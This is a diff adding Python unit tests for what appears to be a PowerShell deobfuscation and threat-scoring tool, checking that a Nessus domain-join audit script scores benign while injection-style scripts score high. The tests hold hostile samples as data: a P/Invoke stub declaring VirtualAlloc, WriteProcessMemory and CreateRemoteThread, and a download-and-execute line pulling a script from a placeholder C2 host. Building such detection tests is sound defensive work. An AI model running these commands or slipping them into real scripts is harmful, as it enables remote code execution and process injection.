@@ -84,5 +84,61 @@ class TestHereStringPreservation(unittest.TestCase):
         self.assertNotIn("\x00", verdict.primary_unmasked_payload)
 
 
+class TestVaScannerAuditRigidity(unittest.TestCase):
+    def test_nessus_netgetjoininformation_audit_scores_benign(self):
+        nessus_script = (
+            "$code = @'\n"
+            "using System;\n"
+            "using System.Runtime.InteropServices;\n"
+            "public class DomainCheck {\n"
+            "  [DllImport(\"Netapi32.dll\", CharSet = CharSet.Unicode)]\n"
+            "  public static extern int NetGetJoinInformation(string server, out IntPtr domain, out int status);\n"
+            "  [DllImport(\"Netapi32.dll\")]\n"
+            "  public static extern int NetApiBufferFree(IntPtr buffer);\n"
+            "}\n"
+            "'@\n"
+            "Add-Type -TypeDefinition $code"
+        )
+        # Raw multi-line script
+        v_raw = unmask_command(nessus_script)
+        self.assertEqual(v_raw.severity, Severity.BENIGN)
+        self.assertEqual(v_raw.risk_score, 0)
+
+        # UTF-16LE -EncodedCommand wrapped (standard Nessus execution)
+        b64 = base64.b64encode(nessus_script.encode("utf-16le")).decode("ascii")
+        v_enc = unmask_command(f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {b64}")
+        self.assertEqual(v_enc.severity, Severity.BENIGN)
+        self.assertEqual(v_enc.risk_score, 0)
+        self.assertEqual(v_enc.behavioral_matches, [])
+
+    def test_malicious_pinvoke_injection_and_hybrid_score_high_or_critical(self):
+        inj_script = (
+            "$c = @'\n"
+            "using System.Runtime.InteropServices;\n"
+            "public class Injector {\n"
+            "  [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);\n"
+            "  [DllImport(\"kernel32.dll\")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr b, byte[] d, uint n, out int w);\n"
+            "  [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr st, IntPtr p, uint f, out uint id);\n"
+            "}\n"
+            "'@\n"
+            "Add-Type -TypeDefinition $c"
+        )
+        b64_inj = base64.b64encode(inj_script.encode("utf-16le")).decode("ascii")
+        v_inj = unmask_command(f"powershell.exe -NoP -EncodedCommand {b64_inj}")
+        self.assertGreaterEqual(v_inj.severity.rank, Severity.HIGH.rank)
+        self.assertTrue(any(m.mitre_id == "T1055" for m in v_inj.behavioral_matches))
+
+        # Adversarial hybrid: NetGetJoinInformation + VirtualAlloc + DownloadString
+        hybrid_script = (
+            "Add-Type '[DllImport(\"Netapi32.dll\")] public static extern int NetGetJoinInformation(string s, out IntPtr b, out int t); "
+            "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);'; "
+            "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example/a.ps1')"
+        )
+        v_hyb = unmask_command(hybrid_script)
+        self.assertGreaterEqual(v_hyb.severity.rank, Severity.HIGH.rank)
+        self.assertTrue(any(m.mitre_id == "T1055" for m in v_hyb.behavioral_matches))
+        self.assertTrue(any(m.mitre_id == "T1105" for m in v_hyb.behavioral_matches))
+
+
 if __name__ == "__main__":
     unittest.main()
